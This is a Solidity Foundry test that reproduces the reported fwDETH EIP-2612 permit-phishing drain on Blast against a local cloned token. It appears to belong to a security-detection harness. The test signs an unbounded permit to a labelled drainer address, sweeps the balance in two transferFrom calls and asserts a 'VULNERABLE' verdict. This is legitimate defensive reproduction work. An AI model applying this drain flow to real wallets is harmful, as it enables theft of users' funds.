// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {FwDethPermitClone} from "../fixtures/permit-phishing/b-incident/FwDethPermitClone.sol";

/// @title permit-phishing tier (b): fwDETH EIP-2612 permit phishing drain, ~$35M (Blast, 2024-10-11).
/// @notice MECHANISM-level reproduction (no public drain-tx hash; official blastscan.io deprecated;
///         see PROVENANCE.md). The victim signed ONE offline EIP-2612 `permit` granting the
///         attacker an unbounded allowance; the attacker then swept the entire fwDETH balance with
///         TWO `transferFrom` calls (the two reported stages: 12,817.15 + 2,261.85 fwDETH =
///         15,079 total). The harness MUST flag this (verdict VULNERABLE, label vuln).
///
///         The owner is a test key (no real victim key / full victim address is used - the
///         published victim address 0xEab2E...a393 is truncated and is NOT reconstructed). The
///         recipient label is the one full address independently observed receiving the drained
///         proceeds on a live Blast explorer. Reported AMOUNTS are the sources' figures. Verdict
///         derived from the real outcome, not hardcoded.
contract FwDethPermitIncidentTest is Test {
    // Reported fwDETH amounts swept from the victim (18 decimals), in the two reported stages.
    uint256 constant STAGE_1 = 12817150000000000000000; // 12,817.15 fwDETH
    uint256 constant STAGE_2 = 2261850000000000000000;  //  2,261.85 fwDETH
    uint256 constant START_BALANCE = STAGE_1 + STAGE_2;  // 15,079 fwDETH

    // Downstream address observed (Routescan Blast explorer) receiving/selling the proceeds.
    // Used only as a labelled recipient of the modeled sweep (see PROVENANCE.md).
    address constant DRAINER = 0x0605eDeE6a8b8b553caE09Abe83b2ebeb75516eC;

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat("[permit-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED")
        );
    }

    function test_permitPhishing_fwdeth_incident_vulnerable() public {
        FwDethPermitClone token = new FwDethPermitClone();

        uint256 victimPk = 0xC0FFEE; // test key (no real victim key / full address available)
        address victim = vm.addr(victimPk);
        token.mint(victim, START_BALANCE);

        // Phishing permit: victim tricked into signing an UNBOUNDED permit naming the attacker.
        uint256 value = type(uint256).max;
        uint256 deadline = block.timestamp + 365 days;
        bytes32 structHash = keccak256(
            abi.encode(token.PERMIT_TYPEHASH(), victim, DRAINER, value, token.nonces(victim), deadline)
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);

        // The attacker submits the signed permit -> unbounded allowance is set.
        vm.prank(DRAINER);
        token.permit(victim, DRAINER, value, deadline, v, r, s);
        assertEq(token.allowance(victim, DRAINER), value, "phishing permit granted unbounded allowance");

        // The attacker sweeps the whole balance in the two reported stages.
        vm.startPrank(DRAINER);
        token.transferFrom(victim, DRAINER, STAGE_1);
        token.transferFrom(victim, DRAINER, STAGE_2);
        vm.stopPrank();

        bool drained = (token.balanceOf(victim) == 0);
        _report("fwdeth-permit-victim", drained);

        assertTrue(drained, "fwDETH permit-phishing must drain the victim (VULNERABLE)");
        assertEq(token.balanceOf(DRAINER), START_BALANCE, "attacker received the full 15,079 fwDETH");
    }
}
